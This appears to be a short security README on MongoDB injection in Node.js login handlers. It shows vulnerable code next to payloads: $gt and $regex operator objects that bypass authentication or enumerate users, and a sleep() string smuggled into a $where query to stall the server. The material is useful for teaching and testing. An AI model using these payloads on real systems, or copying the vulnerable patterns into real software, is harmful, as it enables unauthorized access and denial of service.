

### MONGODB INJECTION VULNERABILITY CODE SMELLS LIKE BELOW

##### check for this nosqlinjector tool
https://github.com/blessingcharles/nosqlInjector/

## if you check login like this without encrypting password we are in

    const {email , password} = req.body

        if(!email || !password) return res.json({error : "invalid data"})

        let identifyUser ;

        try{
            identifyUser = await userModel.findOne({email:email,password:password})
        }
        catch(err){
            return res.json({error : "something went wrong"})
        }

        
        if(identifyUser){

            //generate token other stuffs
            return res.json({msg:"you hacked it"})
        }


## INJECTION VALUES

        {
            "email":{
                "$gt":""
            },
            "password":{
                "$gt":""
            }
        }


        {
            "email":{
                "$regex":".*"
            },
            "password":{
                "$gt":""
            }
        }
[lack of proper sanitization may lead to leverage in lots of authorization issues]

### eventhough you encrypt your password and store , attacker can use regex to validate the name and bruteforce the password

        [codeSNIPPETS]
            try{
                identifyUser = await User.findOne({email:email})
            }
            catch(err){
                const error = new httpError('try again later',500)
                return next(error);
            }
            //decoding the password and comparing
            let isPasswordValid = false
            try{
            isPasswordValid= await bcrypt.compare(password,identifyUser.password)
            }catch(err){
                let error = new Error('failed to login user');
                error.code = 400
                return next(error)
            }

        INJECTION VALUE

        {
            "email":{
                "$regex":"t.*"
            },
            "password":"thomas"
        }


#### use of where clause leads to usage of many functions like sleep leads to dos of the server


        let {email , password} = req.body

        if(!email || !password) return res.json({error : "invalid data"})

        let identifyUser ;

        console.log(email)
        
        const query = {$where:"this.email == '"+email+ "' "}
        
        console.log(query)

         //  {$where:"this.email == '' ; sleep(5000);''"}

        try{
            identifyUser = await userModel.findOne(query)
        }
        catch(err){
            console.log(err)
            return res.json({error : "something went wrong"})
        }

## injecting value

    {
        "email":"';sleep(50000);'",
        "password":"thomas"
    }



